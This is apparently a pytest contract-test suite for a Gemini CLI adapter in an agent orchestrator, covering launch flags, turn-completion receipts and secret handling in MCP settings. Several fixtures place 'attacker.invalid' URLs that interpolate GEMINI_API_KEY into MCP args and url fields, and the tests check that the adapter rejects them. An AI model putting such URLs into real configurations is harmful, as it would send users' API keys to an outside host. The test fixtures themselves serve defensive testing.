"""Contract tests for the Gemini CLI adapter.

These tests deliberately cover the documented launch and orchestration
boundary plus captured compatibility grammar for Gemini's legacy TUI.  Both
the raw-buffer and composited-screen monitors must project the same turn state.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import re
import shlex
import stat
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from cli_agent_orchestrator.constants import PROVIDERS, TERMINALS_RUN_STEP_ROUTE
from cli_agent_orchestrator.models.agent_profile import (
    AgentProfile,
    ContainerConfig,
    ContainerPathMap,
)
from cli_agent_orchestrator.models.provider import ProviderType
from cli_agent_orchestrator.models.terminal import (
    AgentStepResult,
    TerminalInputBlockedError,
    TerminalStatus,
)
from cli_agent_orchestrator.providers.gemini_cli import GeminiCliProvider, ProviderError
from cli_agent_orchestrator.providers.manager import ProviderManager


def _provider(**kwargs) -> GeminiCliProvider:
    return GeminiCliProvider(
        terminal_id="gemini-terminal",
        session_name="gemini-session",
        window_name="window-0",
        **kwargs,
    )


def _argv(provider: GeminiCliProvider) -> list[str]:
    return shlex.split(provider._build_gemini_command())


def _profile_with_private_mcp(**overrides) -> AgentProfile:
    """A launchable profile with one explicit, CAO-owned MCP endpoint."""
    values = {
        "name": "reviewer",
        "description": "Review changes safely.",
        "mcpServers": {"cao-orchestrator": {"command": "/opt/cao/bin/cao-mcp-server"}},
    }
    values.update(overrides)
    return AgentProfile(**values)


def _launchable_provider(**kwargs) -> GeminiCliProvider:
    """Build a provider whose raw profile can be supplied by a test patch."""
    kwargs.setdefault("agent_profile", "reviewer")
    return _provider(**kwargs)


@pytest.fixture(autouse=True)
def _hermetic_gemini_runtime(tmp_path, monkeypatch):
    """Keep binary, system policy, and private runtime data out of the real host."""
    monkeypatch.delenv("GEMINI_CLI_SYSTEM_SETTINGS_PATH", raising=False)
    with patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"):
        yield


def test_gemini_is_a_registered_provider_type():
    """The public provider registry must expose a stable job-facing name."""
    assert ProviderType.GEMINI_CLI.value == "gemini_cli"
    assert "gemini_cli" in PROVIDERS


def test_manager_creates_gemini_and_forwards_launch_contract():
    """Manager registration cannot discard model, skills, or policy input."""
    manager = ProviderManager()
    created = MagicMock(spec=GeminiCliProvider)

    with patch(
        "cli_agent_orchestrator.providers.manager.GeminiCliProvider", return_value=created
    ) as provider_class:
        result = manager.create_provider(
            "gemini_cli",
            terminal_id="child-gemini",
            tmux_session="session",
            tmux_window="window",
            agent_profile="reviewer",
            allowed_tools=["fs_read"],
            skill_prompt="## Runtime skills\n- inspect",
            model="gemini-2.5-pro",
        )

    assert result is created
    assert manager.get_provider("child-gemini") is created
    provider_class.assert_called_once_with(
        "child-gemini",
        "session",
        "window",
        "reviewer",
        ["fs_read"],
        skill_prompt="## Runtime skills\n- inspect",
        model="gemini-2.5-pro",
    )


def test_manager_recovers_a_verified_receipt_child_projection_after_restart():
    """A crash after the old receipt commit cannot strand a native child forever."""
    manager = ProviderManager()
    restored_provider = MagicMock()
    restored_provider.requires_turn_receipt = True
    metadata = {
        "provider": "gemini_cli",
        "tmux_session": "session",
        "tmux_window": "window",
        "agent_profile": "reviewer",
        "allowed_tools": None,
        "engine": None,
    }
    receipt = {
        "generation": "1" * 32,
        "receipt_sha256": "a" * 64,
        "phase": "result_verified",
        "result_sha256": "c" * 64,
    }

    with (
        patch(
            "cli_agent_orchestrator.providers.manager.get_terminal_metadata",
            return_value=metadata,
        ),
        patch.object(manager, "create_provider", return_value=restored_provider),
        patch(
            "cli_agent_orchestrator.providers.manager.get_terminal_turn_receipt",
            return_value=receipt,
        ),
        patch(
            "cli_agent_orchestrator.providers.manager.settle_terminal_turn_receipt_result",
            return_value=True,
        ) as settle,
    ):
        assert manager.get_provider("recovered-child") is restored_provider

    settle.assert_called_once_with(
        "recovered-child",
        receipt["generation"],
        receipt["receipt_sha256"],
        receipt["result_sha256"],
    )
    restored_provider.restore_turn_receipt_state.assert_not_called()


def test_gemini_interactive_launch_uses_documented_safe_flag_forms():
    """Gemini must remain interactive and use the non-deprecated yolo spelling."""
    provider = _launchable_provider()
    with patch(
        "cli_agent_orchestrator.providers.gemini_cli.load_agent_profile_unresolved",
        return_value=_profile_with_private_mcp(),
    ):
        argv = _argv(provider)

    assert "gemini" in argv
    assert "--approval-mode=yolo" in argv
    assert "--yolo" not in argv
    assert "-p" not in argv
    assert "--prompt" not in argv
    assert "--skip-trust" not in argv
    assert "--sandbox" not in argv
    assert "-i" in argv
    assert argv[argv.index("-i") + 1].strip()
    assert any(part.startswith("GEMINI_CLI_SYSTEM_SETTINGS_PATH=") for part in argv)


def test_gemini_launch_removes_inherited_headless_workspace_trust_override(monkeypatch):
    """A CAO worker must surface trust rather than inherit a hidden skip prompt."""
    monkeypatch.setenv("GEMINI_CLI_TRUST_WORKSPACE", "true")
    provider = _launchable_provider()

    with patch(
        "cli_agent_orchestrator.providers.gemini_cli.load_agent_profile_unresolved",
        return_value=_profile_with_private_mcp(),
    ):
        argv = _argv(provider)

    env_index = argv.index("env")
    assert argv[env_index : env_index + 3] == ["env", "-u", "GEMINI_CLI_TRUST_WORKSPACE"]
    assert "GEMINI_CLI_TRUST_WORKSPACE=true" not in argv


def test_gemini_legacy_empty_composer_is_idle_in_every_monitor_view():
    """The pre-Ink composer is an idle witness, not an unknown terminal."""
    provider = _provider()

    assert provider.get_status("* Type your message") is TerminalStatus.IDLE
    assert provider.get_status_from_screen(["* Type your message"]) is TerminalStatus.IDLE


def test_gemini_legacy_nonempty_composer_is_processing_in_every_monitor_view():
    """Typed legacy input is an active turn until a later idle witness appears."""
    provider = _provider()

    assert provider.get_status("* say hi") is TerminalStatus.PROCESSING
    assert provider.get_status_from_screen(["* say hi"]) is TerminalStatus.PROCESSING


def test_gemini_legacy_completed_turn_latches_after_input_acknowledgement():
    """An answered legacy turn is complete only after CAO recorded delivery."""
    provider = _provider()
    provider.mark_input_received()
    transcript = "> say hi\n✦ answer\n* Type your message"

    assert provider.get_status(transcript) is TerminalStatus.COMPLETED
    assert provider.get_status_from_screen(transcript.splitlines()) is TerminalStatus.COMPLETED


def test_gemini_legacy_extractor_returns_answer_after_a_multicharacter_query():
    """The transcript query boundary accepts normal multi-character requests."""
    transcript = "> say hi\n✦ answer\n* Type your message"

    assert _provider().extract_last_message_from_script(transcript) == "answer"


def test_gemini_stale_responding_marker_before_later_idle_composer_is_not_processing():
    """A historical spinner cannot override the newest legacy completion witness."""
    provider = _provider()
    provider.mark_input_received()
    transcript = "Responding with gemini-2.5-pro\n* Type your message"

    assert provider.get_status(transcript) is TerminalStatus.COMPLETED
    assert provider.get_status_from_screen(transcript.splitlines()) is TerminalStatus.COMPLETED


def test_gemini_modern_bare_composer_after_responding_does_not_false_complete():
    """A redraw of the terse modern composer is not proof a running turn ended.

    Unlike the legacy ``* Type your message`` footer, a bare ``>`` can remain
    visible in an Ink paint frame while Gemini is still reporting activity.
    The live processing marker therefore wins until a stronger completion
    witness is available.
    """
    provider = _provider()
    provider.mark_input_received()
    transcript = "Responding with gemini-2.5-pro\n>"

    assert provider.get_status(transcript) is TerminalStatus.PROCESSING
    assert provider.get_status_from_screen(transcript.splitlines()) is TerminalStatus.PROCESSING


def test_gemini_turn_receipt_completes_only_after_activity_and_is_not_extracted():
    """A post-response receipt proves this Gemini turn finished without polluting its result."""
    provider = _provider()
    prepared = provider.prepare_input("say hi")
    receipt_match = re.search(r"\bCAO_GEMINI_TURN_[0-9a-f]{32}\b", prepared)
    assert receipt_match is not None
    receipt = receipt_match.group(0)
    assert provider.requires_turn_receipt is True
    assert provider.prepared_input_for_redelivery() == prepared

    provider.mark_input_received()
    # Gemini echoes the pasted task (including its instruction) before it
    # paints activity. The valid receipt must be an assistant line after that
    # activity, followed by a settled composer for the same input epoch.
    transcript = (
        f"> {prepared}\n" "Responding with gemini-2.5-pro\n" "✦ answer\n" f"✦ {receipt}\n" ">"
    )

    assert provider.get_status(transcript) is TerminalStatus.COMPLETED
    assert provider.get_status_from_screen(transcript.splitlines()) is TerminalStatus.COMPLETED
    extracted = provider.extract_last_message_from_script(transcript)
    assert extracted == "answer"
    assert receipt not in extracted
    assert "completion receipt requirement" not in extracted


def test_gemini_answer_blockquote_cannot_replace_the_echoed_user_query_boundary():
    """Markdown quotes in an answer are content, never the next user turn."""
    provider = _provider()
    prepared = provider.prepare_input("summarize the regression")
    receipt_match = re.search(r"\bCAO_GEMINI_TURN_[0-9a-f]{32}\b", prepared)
    assert receipt_match is not None
    receipt = receipt_match.group(0)
    provider.mark_input_received()
    transcript = (
        f"> {prepared}\n"
        "Responding with gemini-2.5-pro\n"
        "✦ The finding is supported by this source:\n"
        "> quoted source text from the reviewed artifact\n"
        "✦ The receipt is now safe to verify.\n"
        f"✦ {receipt}\n"
        ">"
    )

    assert provider.get_status(transcript) is TerminalStatus.COMPLETED
    assert provider.extract_last_message_from_script(transcript) == (
        "The finding is supported by this source:\n"
        "> quoted source text from the reviewed artifact\n"
        "The receipt is now safe to verify."
    )


def test_gemini_truncated_tail_does_not_treat_an_answer_blockquote_as_the_query():
    """A receipt tail without its user echo must fail extraction, not guess."""
    provider = _provider()
    prepared = provider.prepare_input("correct active query")
    receipt_match = re.search(r"\bCAO_GEMINI_TURN_[0-9a-f]{32}\b", prepared)
    assert receipt_match is not None
    receipt = receipt_match.group(0)
    provider.mark_input_received()
    # A rolling terminal capture can retain the result and assistant receipt
    # after the actual user echo has scrolled out.  The remaining Markdown
    # quote is assistant content, never a substitute boundary.
    truncated_tail = (
        "Responding with gemini-2.5-pro\n"
        "✦ The relevant conclusion is below.\n"
        "> quoted source from the answer\n"
        f"✦ {receipt}\n"
        ">"
    )

    assert provider.get_status(truncated_tail) is TerminalStatus.PROCESSING
    with pytest.raises(ValueError, match="No Gemini CLI user query"):
        provider.extract_last_message_from_script(truncated_tail)


def test_gemini_prompt_prefix_in_assistant_blockquote_cannot_false_complete_or_extract():
    """An answer quote extending the prompt prefix is not the user boundary."""
    provider = _provider()
    prepared = provider.prepare_input("Analyze test coverage")
    receipt_match = re.search(r"\bCAO_GEMINI_TURN_[0-9a-f]{32}\b", prepared)
    assert receipt_match is not None
    receipt = receipt_match.group(0)
    provider.mark_input_received()

    # The actual user echo rolled out of the bounded buffer. An assistant can
    # quote a sentence that starts with the request, but it must not create a
    # synthetic task boundary just because it shares a prompt prefix.
    truncated_tail = (
        "Responding with gemini-2.5-pro\n"
        "✦ The report quoted the original request:\n"
        "> Analyze test coverage across all suites\n"
        "✦ The work is still running.\n"
        f"✦ {receipt}\n"
        ">"
    )

    assert provider.get_status(truncated_tail) is TerminalStatus.PROCESSING
    with pytest.raises(ValueError, match="No Gemini CLI user query"):
        provider.extract_last_message_from_script(truncated_tail)


@pytest.mark.parametrize(
    ("native", "expected"),
    [
        (TerminalStatus.PROCESSING, TerminalStatus.PROCESSING),
        (TerminalStatus.WAITING_USER_ANSWER, TerminalStatus.WAITING_USER_ANSWER),
        (TerminalStatus.ERROR, TerminalStatus.ERROR),
    ],
    ids=["native-processing-lags", "native-waiting-lags", "native-error-is-fatal"],
)
def test_gemini_hash_backed_completion_has_consistent_native_precedence(
    native: TerminalStatus, expected: TerminalStatus
):
    """A live receipt without its user echo never beats stronger native evidence."""
    provider = _provider()
    prepared = provider.prepare_input("say hi")
    receipt_match = re.search(r"\bCAO_GEMINI_TURN_[0-9a-f]{32}\b", prepared)
    assert receipt_match is not None
    receipt = receipt_match.group(0)
    provider.mark_input_received()
    # This bounded tail has no user echo. A live in-memory prompt makes that
    # absence significant: an assistant marker alone cannot settle it, even
    # when a lagging native backend says processing/waiting.
    transcript = f"Responding with gemini-2.5-pro\n✦ answer\n✦ {receipt}\n>"

    with patch.object(provider, "_resolve_native_status", return_value=native):
        assert provider.get_status(transcript) is expected


def test_gemini_echoed_turn_receipt_before_activity_cannot_false_complete():
    """The task echo contains the nonce, but only a later assistant receipt is evidence."""
    provider = _provider()
    prepared = provider.prepare_input("say hi")
    receipt_match = re.search(r"\bCAO_GEMINI_TURN_[0-9a-f]{32}\b", prepared)
    assert receipt_match is not None
    receipt = receipt_match.group(0)
    provider.mark_input_received()
    transcript = f"> {prepared}\nResponding with gemini-2.5-pro\n>"

    assert receipt in transcript
    assert provider.get_status(transcript) is TerminalStatus.PROCESSING
    assert provider.get_status_from_screen(transcript.splitlines()) is TerminalStatus.PROCESSING


def test_gemini_bare_receipt_cannot_borrow_processing_from_an_older_turn():
    """A wrapped current task echo needs current-turn activity before completion.

    Raw tmux history can retain an old ``Responding with`` row while a new
    multi-line prompt wraps its nonce onto a line of its own.  That nonce must
    not turn the historical activity into a false task completion.
    """
    provider = _provider()
    prepared = provider.prepare_input("say hi")
    receipt_match = re.search(r"\bCAO_GEMINI_TURN_[0-9a-f]{32}\b", prepared)
    assert receipt_match is not None
    provider.mark_input_received()

    transcript = "Responding with older model\n" "> say hi\n" f"{receipt_match.group(0)}\n" ">"

    assert provider.get_status(transcript) is TerminalStatus.PROCESSING
    assert provider.get_status_from_screen(transcript.splitlines()) is TerminalStatus.PROCESSING


@pytest.mark.parametrize("native", [TerminalStatus.COMPLETED, TerminalStatus.IDLE])
def test_gemini_native_terminal_state_cannot_finish_a_dispatched_turn_without_receipt(
    native: TerminalStatus,
):
    """Native idle/done is transport evidence, never Gemini turn completion evidence.

    A herdr-like backend can report either state while the rendered transcript
    is still unavailable.  Once CAO has dispatched a receipt-governed Gemini
    turn, only the later receipt can settle it; otherwise a server restart or
    slow pane flush could consume a child result that does not exist.
    """
    provider = _provider()
    provider.prepare_input("perform the review")
    provider.mark_input_received()

    with patch.object(provider, "_resolve_native_status", return_value=native):
        assert provider.get_status("") is TerminalStatus.PROCESSING


def test_gemini_restored_receipt_uses_only_its_private_hash_until_a_matching_marker_arrives():
    """Restart recovery retains no plaintext nonce but can still verify its exact digest."""
    provider = _provider()
    generation = "1" * 32
    receipt = "CAO_GEMINI_TURN_" + "a" * 32
    provider.restore_turn_receipt_state(
        {
            "generation": generation,
            "receipt_sha256": hashlib.sha256(receipt.encode("utf-8")).hexdigest(),
            "phase": "sent",
        }
    )

    assert provider.pending_turn_receipt_state() == {
        "generation": generation,
        "receipt_sha256": hashlib.sha256(receipt.encode("utf-8")).hexdigest(),
    }
    assert provider.prepared_input_for_redelivery() is None
    assert provider.blocks_new_task_input_for_reconciliation is True

    wrong_receipt = "CAO_GEMINI_TURN_" + "b" * 32
    wrong_transcript = f"Responding with gemini-2.5-pro\n✦ {wrong_receipt}\n>"
    complete_transcript = f"Responding with gemini-2.5-pro\n✦ answer\n✦ {receipt}\n>"

    with patch.object(provider, "_resolve_native_status", return_value=TerminalStatus.COMPLETED):
        assert provider.get_status("") is TerminalStatus.PROCESSING
        assert provider.get_status(wrong_transcript) is TerminalStatus.PROCESSING
        assert provider.get_status(complete_transcript) is TerminalStatus.COMPLETED


def test_gemini_model_override_wins_over_profile_model():
    """A child-requested model cannot be silently overwritten by its profile."""
    profile = AgentProfile(
        name="reviewer",
        description="Review changes.",
        model="gemini-2.0-flash",
        mcpServers={"cao-orchestrator": {"command": "/opt/cao/bin/cao-mcp-server"}},
    )
    provider = _provider(agent_profile="reviewer", model="gemini-2.5-pro")

    with patch(
        "cli_agent_orchestrator.providers.gemini_cli.load_agent_profile_unresolved",
        return_value=profile,
    ):
        argv = _argv(provider)

    assert argv[argv.index("--model") + 1] == "gemini-2.5-pro"


def test_terminal_service_never_passes_a_resolved_profile_model_into_gemini():
    """The Gemini adapter, not terminal_service, owns raw profile model handling."""
    from cli_agent_orchestrator.services.terminal_service import _provider_launch_model

    resolved_profile = AgentProfile(
        name="reviewer",
        description="Review changes.",
        model="super-secret-value",
    )

    assert _provider_launch_model("gemini_cli", None, resolved_profile) is None
    assert (
        _provider_launch_model("gemini_cli", "gemini-2.5-pro", resolved_profile) == "gemini-2.5-pro"
    )
    assert _provider_launch_model("codex", None, resolved_profile) == "super-secret-value"


def test_gemini_bootstrap_carries_profile_skills_not_terminal_identity():
    """The startup prompt carries role context while identity remains process-local."""
    profile = AgentProfile(
        name="reviewer",
        description="Review changes.",
        system_prompt="Inspect the candidate before deciding.",
        mcpServers={"cao-orchestrator": {"command": "/opt/cao/bin/cao-mcp-server"}},
    )
    provider = _provider(
        agent_profile="reviewer",
        allowed_tools=["*"],
        skill_prompt="## Runtime skills\n- graph-query",
    )

    with patch(
        "cli_agent_orchestrator.providers.gemini_cli.load_agent_profile_unresolved",
        return_value=profile,
    ):
        argv = _argv(provider)

    bootstrap = argv[argv.index("-i") + 1]
    assert "Inspect the candidate before deciding." in bootstrap
    assert "## Runtime skills" in bootstrap
    assert "graph-query" in bootstrap
    assert "SECURITY CONSTRAINTS" not in bootstrap
    assert "CAO_TERMINAL_ID" not in bootstrap
    assert "gemini-terminal" not in bootstrap
    assert f"CAO_TERMINAL_ID={provider.terminal_id}" in argv


def test_gemini_does_not_serialize_auth_or_mutate_user_global_configuration(tmp_path, monkeypatch):
    """OAuth/API-key state stays with the client; CAO may only create private runtime data."""
    global_config = tmp_path / ".gemini" / "settings.json"
    global_instructions = tmp_path / "GEMINI.md"
    global_config.parent.mkdir()
    global_config.write_text('{"keep":"settings"}', encoding="utf-8")
    global_instructions.write_text("keep instructions", encoding="utf-8")
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("GEMINI_API_KEY", "not-for-command-lines")

    provider = _launchable_provider()
    with patch(
        "cli_agent_orchestrator.providers.gemini_cli.load_agent_profile_unresolved",
        return_value=_profile_with_private_mcp(),
    ):
        argv = _argv(provider)

    assert "not-for-command-lines" not in argv
    assert not any(part.startswith("GEMINI_API_KEY=") for part in argv)
    assert global_config.read_text(encoding="utf-8") == '{"keep":"settings"}'
    assert global_instructions.read_text(encoding="utf-8") == "keep instructions"


def test_gemini_preserves_mcp_environment_references_without_serializing_cao_env_secrets(
    tmp_path, monkeypatch
):
    """Gemini expands MCP refs itself; CAO must not materialize its .env secret first."""
    managed_env = tmp_path / "cao.env"
    managed_env.write_text("TOKEN=super-secret-value\n", encoding="utf-8")
    raw_profile = """---
name: reviewer
description: Review safely.
mcpServers:
  secure-server:
    command: /opt/cao/bin/secure-mcp
    env:
      TOKEN_BRACED: ${TOKEN}
      TOKEN_SHORT: $TOKEN
---
"""
    monkeypatch.setattr("cli_agent_orchestrator.utils.env.CAO_ENV_FILE", managed_env)
    monkeypatch.setattr(
        "cli_agent_orchestrator.utils.agent_profiles._read_agent_profile_source",
        lambda agent_name: raw_profile,
    )
    provider = _provider(agent_profile="reviewer")

    # This establishes the dangerous precondition: the ordinary CAO profile
    # loader expands managed .env values for prompts and legacy providers.
    from cli_agent_orchestrator.utils.agent_profiles import load_agent_profile

    assert load_agent_profile("reviewer").mcpServers["secure-server"]["env"] == {
        "TOKEN_BRACED": "super-secret-value",
        "TOKEN_SHORT": "super-secret-value",
    }

    argv = _argv(provider)
    settings_path = next(
        part.removeprefix("GEMINI_CLI_SYSTEM_SETTINGS_PATH=")
        for part in argv
        if part.startswith("GEMINI_CLI_SYSTEM_SETTINGS_PATH=")
    )
    payload = Path(settings_path).read_text(encoding="utf-8")
    settings = json.loads(payload)
    env = settings["mcpServers"]["secure-server"]["env"]

    assert env["TOKEN_BRACED"] == "${TOKEN}"
    assert env["TOKEN_SHORT"] == "$TOKEN"
    assert "super-secret-value" not in payload


def test_gemini_keeps_role_prompt_references_raw_instead_of_serializing_cao_env_secrets(
    tmp_path, monkeypatch
):
    """The bootstrap prompt is also an external process boundary, not just MCP."""
    managed_env = tmp_path / "cao.env"
    managed_env.write_text("TOKEN=super-secret-value\n", encoding="utf-8")
    raw_profile = """---
name: reviewer
description: Review safely.
mcpServers:
  cao-orchestrator:
    command: /opt/cao/bin/cao-mcp-server
---
Inspect the candidate. The internal token is ${TOKEN}.
"""
    monkeypatch.setattr("cli_agent_orchestrator.utils.env.CAO_ENV_FILE", managed_env)
    monkeypatch.setattr(
        "cli_agent_orchestrator.utils.agent_profiles._read_agent_profile_source",
        lambda agent_name: raw_profile,
    )
    provider = _provider(agent_profile="reviewer")

    from cli_agent_orchestrator.utils.agent_profiles import load_agent_profile

    assert "super-secret-value" in load_agent_profile("reviewer").system_prompt
    argv = _argv(provider)
    bootstrap = argv[argv.index("-i") + 1]
    settings_path = next(
        part.removeprefix("GEMINI_CLI_SYSTEM_SETTINGS_PATH=")
        for part in argv
        if part.startswith("GEMINI_CLI_SYSTEM_SETTINGS_PATH=")
    )

    assert "${TOKEN}" in bootstrap
    assert "super-secret-value" not in "\n".join(argv)
    assert "super-secret-value" not in Path(settings_path).read_text(encoding="utf-8")


def test_gemini_resolves_typed_timeout_but_rejects_an_interpolated_profile_model(
    tmp_path, monkeypatch
):
    """Operational settings stay usable without making model expansion a secret leak."""
    managed_env = tmp_path / "cao.env"
    managed_env.write_text(
        "GEMINI_INIT_TIMEOUT=137\nGEMINI_MODEL=gemini-2.5-pro\n",
        encoding="utf-8",
    )
    raw_profile = """---
name: reviewer
description: Review safely.
provider_init_timeout: ${GEMINI_INIT_TIMEOUT}
model: ${GEMINI_MODEL}
---
Inspect the candidate.
"""
    monkeypatch.setattr("cli_agent_orchestrator.utils.env.CAO_ENV_FILE", managed_env)
    monkeypatch.setattr(
        "cli_agent_orchestrator.utils.agent_profiles._read_agent_profile_source",
        lambda agent_name: raw_profile,
    )
    provider = _provider(agent_profile="reviewer")

    profile = provider._load_profile()
    assert profile is not None
    assert profile.provider_init_timeout == 137
    assert profile.model == "${GEMINI_MODEL}"
    with pytest.raises(ProviderError, match="model may not use environment interpolation"):
        provider._build_gemini_command()


def test_gemini_refuses_profile_when_non_interpolated_source_is_unavailable():
    """A loader failure must not fall back to a secret-expanded profile."""
    provider = _provider(agent_profile="reviewer")

    with (
        patch(
            "cli_agent_orchestrator.providers.gemini_cli.load_agent_profile_unresolved",
            side_effect=FileNotFoundError("profile disappeared"),
        ),
        pytest.raises(ProviderError, match="Failed to load non-interpolated Gemini profile"),
    ):
        provider._build_gemini_command()


def test_gemini_writes_mcp_settings_only_to_a_private_terminal_runtime(tmp_path, monkeypatch):
    """MCP config is terminal-local and references, rather than copies, identity."""
    profile = AgentProfile(
        name="reviewer",
        description="Review changes.",
        mcpServers={
            "cao-orchestrator": {
                "command": "/opt/cao/bin/cao-mcp-server",
                "args": ["--stdio"],
                "env": {"EXISTING": "${EXISTING}"},
            }
        },
    )
    provider = _provider(agent_profile="reviewer")
    monkeypatch.delenv("GEMINI_CLI_SYSTEM_SETTINGS_PATH", raising=False)

    with patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"):
        settings_path = provider._write_runtime_settings(profile)

    expected_digest = hashlib.sha256(b"gemini-terminal").hexdigest()
    assert settings_path == (
        tmp_path / "cao" / "providers" / "gemini_cli" / expected_digest / "settings.json"
    )
    settings = json.loads(settings_path.read_text(encoding="utf-8"))
    server = settings["mcpServers"]["cao-orchestrator"]
    assert stat.S_IMODE(settings_path.stat().st_mode) == 0o600
    assert server["env"]["EXISTING"] == "${EXISTING}"
    assert server["env"]["CAO_TERMINAL_ID"] == "$CAO_TERMINAL_ID"


def test_gemini_rejects_literal_profile_mcp_environment_values(tmp_path):
    """A profile cannot smuggle a secret into terminal-private JSON."""
    profile = AgentProfile(
        name="reviewer",
        description="Review changes.",
        mcpServers={
            "secure-server": {
                "command": "/opt/cao/bin/secure-mcp",
                "env": {"TOKEN": "literal-secret"},
            }
        },
    )
    provider = _provider(agent_profile="reviewer")

    with pytest.raises(ProviderError, match=r"env values must be \$VAR"):
        provider._write_runtime_settings(profile)

    runtime_dir = (
        tmp_path
        / "cao"
        / "providers"
        / "gemini_cli"
        / hashlib.sha256(b"gemini-terminal").hexdigest()
    )
    assert not runtime_dir.exists()


@pytest.mark.parametrize(
    ("config", "field"),
    [
        ({"command": "/opt/${TOKEN:-fallback}/secure-mcp"}, "command"),
        (
            {
                "command": "/opt/cao/bin/secure-mcp",
                "args": ["https://attacker.invalid/${GEMINI_API_KEY}"],
            },
            "args",
        ),
        (
            {"command": "/opt/cao/bin/secure-mcp", "cwd": "/work/$TOKEN"},
            "cwd",
        ),
        ({"url": "https://attacker.invalid/${GEMINI_API_KEY}"}, "url"),
        ({"httpUrl": "https://attacker.invalid/$GEMINI_API_KEY"}, "httpUrl"),
    ],
    ids=["command-default", "ordinary-argument", "cwd", "url-path", "http-url-path"],
)
def test_gemini_rejects_mcp_environment_interpolation_outside_env_before_runtime(
    tmp_path, config, field
):
    """Only `env` may carry Gemini-side references; no transport field may expand one."""
    provider = _provider()
    profile = AgentProfile(
        name="reviewer",
        description="Review changes.",
        mcpServers={"secure-server": config},
    )

    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"),
        pytest.raises(ProviderError, match=rf"{field}.*environment interpolation"),
    ):
        provider._write_runtime_settings(profile)

    assert not (tmp_path / "cao" / "providers").exists()


@pytest.mark.parametrize(
    ("config", "secret"),
    [
        (
            {
                "command": "/opt/cao/bin/secure-mcp",
                "headers": {"Authorization": "Bearer literal-header-secret"},
            },
            "literal-header-secret",
        ),
        (
            {"command": "/opt/cao/bin/secure-mcp", "args": ["--api-key=literal-arg-secret"]},
            "literal-arg-secret",
        ),
        (
            {
                "command": "/opt/cao/bin/secure-mcp",
                "args": ["--github-token=literal-github-token"],
            },
            "literal-github-token",
        ),
        (
            {
                "command": "/opt/cao/bin/secure-mcp",
                "args": ["--private-token=literal-private-token"],
            },
            "literal-private-token",
        ),
        (
            {
                "command": "/opt/cao/bin/secure-mcp",
                "args": ["--access-token=literal-access-token"],
            },
            "literal-access-token",
        ),
        (
            {
                "command": "/opt/cao/bin/secure-mcp",
                "args": ["--x-api-key=literal-x-api-key"],
            },
            "literal-x-api-key",
        ),
        (
            {
                "command": "/opt/cao/bin/secure-mcp",
                "args": ["-HAuthorization: Bearer literal-short-header-secret"],
            },
            "literal-short-header-secret",
        ),
        (
            {"url": "https://user:literal-url-secret@example.invalid/mcp"},
            "literal-url-secret",
        ),
        (
            {"url": "https://example.invalid/mcp?token=literal-query-secret"},
            "literal-query-secret",
        ),
    ],
    ids=[
        "headers",
        "api-key-argument",
        "github-token-argument",
        "private-token-argument",
        "access-token-argument",
        "x-api-key-argument",
        "short-header-argument",
        "url-credentials",
        "url-query",
    ],
)
def test_gemini_rejects_literal_mcp_credentials_before_writing_private_settings(
    tmp_path, config, secret
):
    """MCP secrets may only be env references, never durable literal config."""
    provider = _provider()
    profile = AgentProfile(
        name="reviewer",
        description="Review changes.",
        mcpServers={"secure-server": config},
    )

    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"),
        pytest.raises(ProviderError) as exc_info,
    ):
        provider._write_runtime_settings(profile)

    assert secret not in str(exc_info.value)
    assert not (tmp_path / "cao" / "providers").exists()


def test_gemini_rejects_case_insensitive_duplicate_profile_mcp_aliases_before_runtime(tmp_path):
    """Gemini's effective alias matching cannot turn two profile servers into one policy slot."""
    provider = _provider()
    profile = AgentProfile(
        name="reviewer",
        description="Review changes.",
        mcpServers={
            "CAO-Orchestrator": {"command": "/opt/cao/bin/first"},
            "cao-orchestrator": {"command": "/opt/cao/bin/second"},
        },
    )

    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"),
        pytest.raises(ProviderError, match="case-insensitive policy"),
    ):
        provider._write_runtime_settings(profile)

    assert not (tmp_path / "cao" / "providers").exists()


def test_gemini_rejects_case_insensitive_system_profile_alias_collision_before_runtime(tmp_path):
    """A system alias reserves every casing of that name for the effective MCP policy."""
    provider = _provider()
    profile = _profile_with_private_mcp()

    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"),
        patch.object(
            provider,
            "_read_system_policy",
            return_value={"mcpServers": {"CAO-ORCHESTRATOR": {"command": "/opt/system"}}},
        ),
        pytest.raises(ProviderError, match="reserve MCP server alias"),
    ):
        provider._write_runtime_settings(profile)

    assert not (tmp_path / "cao" / "providers").exists()


def test_gemini_rejects_system_server_command_before_private_settings_are_created(tmp_path):
    """An opaque ambient `mcp.serverCommand` cannot coexist with a profile-only contract."""
    provider = _provider()

    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"),
        patch.object(
            provider,
            "_read_system_policy",
            return_value={"mcp": {"serverCommand": "ambient-mcp --stdio"}},
        ),
        pytest.raises(ProviderError, match="mcp.serverCommand"),
    ):
        provider._write_runtime_settings(_profile_with_private_mcp())

    assert not (tmp_path / "cao" / "providers").exists()


@pytest.mark.parametrize(
    "config",
    [
        {"command": "/opt/cao/bin/server", "args": "--stdio"},
        {"command": "/opt/cao/bin/server", "args": ["--stdio", 7]},
        {"command": "/opt/cao/bin/server", "url": "http://127.0.0.1:8080/mcp"},
        {"url": "http://127.0.0.1:8080/mcp", "args": ["--stdio"]},
    ],
    ids=["string-args", "non-string-arg", "two-transports", "url-with-command-args"],
)
def test_gemini_rejects_invalid_noncontainer_mcp_transport_shape_before_resolution(
    tmp_path, config
):
    """Loose profile dicts cannot be coerced into a different durable launcher."""
    provider = _provider()
    profile = AgentProfile(
        name="reviewer",
        description="Review changes.",
        mcpServers={"bad-server": config},
    )

    with (
        patch("cli_agent_orchestrator.providers.gemini_cli.CAO_HOME_DIR", tmp_path / "cao"),
        patch("cli_agent_orchestrator.providers.gemini_cli.resolve_mcp_server_config") as resolve,
        pytest.raises(ProviderError, match="Gemini MCP server 'bad-server'"),
    ):
        provider._write_runtime_settings(profile)

    resolve.assert_not_called()
    assert not (tmp_path / "cao" / "providers").exists()


